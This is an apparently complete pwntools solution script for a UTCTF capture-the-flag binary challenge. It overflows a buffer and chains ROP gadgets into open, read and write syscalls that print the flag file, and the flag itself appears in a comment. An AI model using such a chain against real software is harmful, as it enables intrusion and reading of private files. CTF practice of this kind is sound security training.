#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./chal", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("challenge.utctf.live", 5141)

SCRATCH_MEMORY = 0x4c8f00
GADGET_MOV_QWORD_PTR_RSI_RAX = 0x0000000000452d05 #: mov qword ptr [rsi], rax ; ret
FLAG_SIZE = 32

rop = ROP(elf)
rop.raw(b"A" * 0x88)
# write the path to memory

rop.rsi = SCRATCH_MEMORY
rop.rax = u64(b"./flag.t")
rop.raw(GADGET_MOV_QWORD_PTR_RSI_RAX)
rop.rsi = SCRATCH_MEMORY + 8
rop.rax = u64(b"xt\x00\x00\x00\x00\x00\x00")
rop.raw(GADGET_MOV_QWORD_PTR_RSI_RAX)

# open("./flag.txt", O_RDONLY) => 3
rop.rdi = SCRATCH_MEMORY
rop.rsi = 0
rop.rax = constants.SYS_open
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# read(flag, SCRATCH_MEMORY + 24, FLAG_SIZE)
rop.rdi = 5 # note: that we need fd=3 locally and fd=5 remotely
rop.rsi = SCRATCH_MEMORY + 24
rop.rdx = FLAG_SIZE
rop.rax = constants.SYS_read
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

# write(stdout, SCRATCH_MEMORY + 24, FLAG_SIZE)
rop.rdi = 1
rop.rsi = SCRATCH_MEMORY + 24
rop.rdx = FLAG_SIZE
rop.rax = constants.SYS_write
rop.raw(rop.find_gadget(['syscall', 'ret'])[0])

p.sendlineafter(b"Input> ", rop.chain())

p.readuntil(b"Flag: ")

print(p.readuntil(b"}").decode()) # utflag{r0p_with_4_littl3_catch}
